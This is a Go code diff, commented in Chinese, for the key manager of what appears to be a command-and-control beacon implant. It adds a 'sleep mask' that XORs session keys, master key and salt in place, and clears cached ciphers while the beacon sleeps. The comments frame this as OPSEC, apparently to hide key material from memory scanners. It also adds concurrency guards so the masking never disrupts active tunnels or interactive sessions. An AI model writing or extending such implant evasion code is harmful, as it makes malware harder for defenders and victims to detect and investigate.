@@ -12,6 +12,7 @@ import (
 	"fmt"
 	"io"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"golang.org/x/crypto/hkdf"
@@ -134,16 +135,36 @@ type ClientKeyManager struct {
 	createdAt   time.Time
 	expiresAt   time.Time
 	mu          sync.RWMutex
+
+	// masked 为真时密钥材料处于遮蔽状态：此时取用密钥必须等待还原，
+	// 否则会拿到被 XOR 过的字节去加密（服务端 GCM 认证必然失败）。
+	masked   bool
+	unmasked *sync.Cond // 还原时唤醒等待者
 }
 
 // GlobalClientKeyManager 全局客户端密钥管理器
 var GlobalClientKeyManager *ClientKeyManager
 
+// keyUsersInFlight 正在使用密钥的调用数（加解密进入 +1、返回 -1）。
+//
+// sleep mask 用它判断"此刻有没有人在用密钥"：隧道/交互会话的收发都经过
+// Encrypt/Decrypt，只要有一个在途，遮蔽就会把它挡在门外（见 MaskForSleep）。
+// 注意语义是"在途"而不是"用过"——后者会把 beacon 自己的心跳与命令回执也算进来，
+// 结果是每一轮都判定为忙、遮蔽永不生效。
+var keyUsersInFlight atomic.Int64
+
+// KeyUsersInFlight 返回在途的密钥使用者数（sleep mask 判定用）
+func KeyUsersInFlight() int64 { return keyUsersInFlight.Load() }
+
+// enterKeyUse/exitKeyUse 标记一次密钥使用（供加解密路径与测试使用）
+func enterKeyUse() { keyUsersInFlight.Add(1) }
+func exitKeyUse()  { keyUsersInFlight.Add(-1) }
+
 // InitClientKeyManager 初始化客户端密钥管理器
 func InitClientKeyManager(clientID string) {
-	GlobalClientKeyManager = &ClientKeyManager{
-		clientID: clientID,
-	}
+	ckm := &ClientKeyManager{clientID: clientID}
+	ckm.unmasked = sync.NewCond(&ckm.mu)
+	GlobalClientKeyManager = ckm
 }
 
 // SetSessionKey 设置会话密钥
@@ -229,8 +250,11 @@ func (ckm *ClientKeyManager) SetSessionKeyRotate(nonce []byte) error {
 
 // GetSessionKey 获取会话密钥
 func (ckm *ClientKeyManager) GetSessionKey() ([]byte, error) {
-	ckm.mu.RLock()
-	defer ckm.mu.RUnlock()
+	ckm.mu.Lock()
+	defer ckm.mu.Unlock()
+
+	// 遮蔽期间等待还原（sleep mask 只在 beacon 空闲时启动，正常情况下这里不会等）
+	ckm.waitUnmaskedLocked()
 
 	if ckm.sessionKey == nil {
 		return nil, errors.New("会话密钥未初始化")
@@ -240,7 +264,7 @@ func (ckm *ClientKeyManager) GetSessionKey() ([]byte, error) {
 		return nil, errors.New("会话密钥已过期")
 	}
 
-	// 返回拷贝：调用方（如 sleepmask 就地 XOR）不得污染全局会话密钥
+	// 返回拷贝：调用方不得污染全局会话密钥（sleep mask 走 MaskForSleep 就地遮蔽真身）
 	keyCopy := make([]byte, len(ckm.sessionKey))
 	copy(keyCopy, ckm.sessionKey)
 	return keyCopy, nil
@@ -330,6 +354,11 @@ func EncryptWithSessionKey(data []byte) ([]byte, error) {
 		return nil, errors.New("客户端密钥管理器未初始化")
 	}
 
+	// 先标记"在途"再取密钥：遮蔽判定与在途计数在同一个锁下求值，
+	// 否则会出现"遮蔽刚判定为空闲、这边紧接着开始用密钥"的窗口
+	enterKeyUse()
+	defer exitKeyUse()
+
 	// 【加密体系改造】会话密钥缺失/加密失败直接报错，不再回落旧加密
 	sessionKey, err := GlobalClientKeyManager.GetSessionKey()
 	if err != nil {
@@ -345,11 +374,18 @@ func DecryptWithSessionKey(ciphertext []byte) ([]byte, error) {
 		return nil, errors.New("客户端密钥管理器未初始化")
 	}
 
+	enterKeyUse()
+	defer exitKeyUse()
+
 	ckm := GlobalClientKeyManager
-	ckm.mu.RLock()
-	cur := ckm.sessionKey
-	prev := ckm.previousKey
-	ckm.mu.RUnlock()
+	ckm.mu.Lock()
+	ckm.waitUnmaskedLocked()
+	// 必须在锁内拷贝：直接把切片带出锁使用的话，遮蔽一旦发生在拷贝之后，
+	// 解密用的就是被 XOR 过的字节（表现为服务端/客户端 GCM 认证失败，
+	// 且只在"遮蔽窗口与解密撞车"时偶发）
+	cur := append([]byte{}, ckm.sessionKey...)
+	prev := append([]byte{}, ckm.previousKey...)
+	ckm.mu.Unlock()
 
 	if len(cur) == 0 {
 		return nil, errors.New("会话密钥未初始化")
@@ -363,6 +399,106 @@ func DecryptWithSessionKey(ciphertext []byte) ([]byte, error) {
 		return SecureDecrypt(ciphertext, prev)
 	}
 	return nil, err
+}
+
+// waitUnmaskedLocked 等待遮蔽还原（调用方须持有 ckm.mu 写锁）。
+// 用 Cond 而不是短轮询：遮蔽窗口通常是整个睡眠周期（数秒到数十秒），
+// 轮询既浪费 CPU 也会让等待方在还原后还要多等一个轮询周期。
+func (ckm *ClientKeyManager) waitUnmaskedLocked() {
+	for ckm.masked {
+		ckm.unmasked.Wait()
+	}
+}
+
+// MaskForSleep 在睡眠期间遮蔽全部密钥材料，返回还原函数。
+//
+// 为什么是"就地遮蔽真身"而不是"遮蔽副本"：原实现取 GetSessionKey()（返回拷贝）
+// 再对拷贝做 XOR —— 真正的会话密钥在管理器里原样躺着，遮蔽的是一个谁也看不到的
+// 局部变量。看似有 OPSEC，实际一点没保护。
+//
+// 遮蔽范围：会话密钥、上一把密钥（轮换重叠期）、主密钥与盐（HKDF 的根）、
+// 以及 AEAD 缓存（它以密钥字节为 map key，不清等于又留了一份明文密钥）。
+//
+// 第二个返回值为 false 表示"当前不适合遮蔽"，调用方应只睡眠：此刻有在途的
+// 密钥使用者（隧道/交互会话正在收发），遮蔽会把它们的下一次收发挡到睡眠结束。
+func (ckm *ClientKeyManager) MaskForSleep() (func(), bool) {
+	ckm.mu.Lock()
+	defer ckm.mu.Unlock()
+
+	if ckm.masked || len(ckm.sessionKey) == 0 {
+		return nil, false
+	}
+	if keyUsersInFlight.Load() > 0 {
+		// 此刻有隧道/交互会话在收发：跳过本轮遮蔽，绝不打断活跃会话
+		return nil, false
+	}
+
+	// 逐段就地 XOR：pad 随材料一同保存，还原后立刻擦除
+	type seg struct {
+		buf []byte
+		pad []byte
+	}
+	segs := make([]seg, 0, 5)
+	maskOne := func(buf []byte) bool {
+		if len(buf) == 0 {
+			return true
+		}
+		pad := make([]byte, len(buf))
+		if _, err := rand.Read(pad); err != nil {
+			return false
+		}
+		for i := range buf {
+			buf[i] ^= pad[i]
+		}
+		segs = append(segs, seg{buf: buf, pad: pad})
+		return true
+	}
+
+	ok := maskOne(ckm.sessionKey) && maskOne(ckm.previousKey) &&
+		maskOne(globalMasterKey) && maskOne(globalSalt)
+	if !ok {
+		// 随机源失败：把已遮蔽的部分还原，不做半遮蔽（半遮蔽比不遮蔽更危险）
+		for _, sg := range segs {
+			for i := range sg.buf {
+				sg.buf[i] ^= sg.pad[i]
+			}
+		}
+		return nil, false
+	}
+
+	// 缓存以密钥为 map key：留着等于没遮蔽
+	aeadCache.Range(func(k, _ interface{}) bool {
+		aeadCache.Delete(k)
+		return true
+	})
+	ckm.masked = true
+
+	var once sync.Once
+	return func() {
+		once.Do(func() {
+			ckm.mu.Lock()
+			defer ckm.mu.Unlock()
+			for _, sg := range segs {
+				for i := range sg.buf {
+					sg.buf[i] ^= sg.pad[i]
+				}
+				// 擦除 pad：还原之后它没有任何用途，留着只是多一份可被
+				// "密文 XOR pad" 还原密钥的材料
+				for i := range sg.pad {
+					sg.pad[i] = 0
+				}
+			}
+			ckm.masked = false
+			ckm.unmasked.Broadcast()
+		})
+	}, true
+}
+
+// MaskedForTest 报告当前是否处于遮蔽状态（测试用）
+func (ckm *ClientKeyManager) MaskedForTest() bool {
+	ckm.mu.Lock()
+	defer ckm.mu.Unlock()
+	return ckm.masked
 }
 
 // BytesToMD5 计算字节数组的 MD5 哈希值
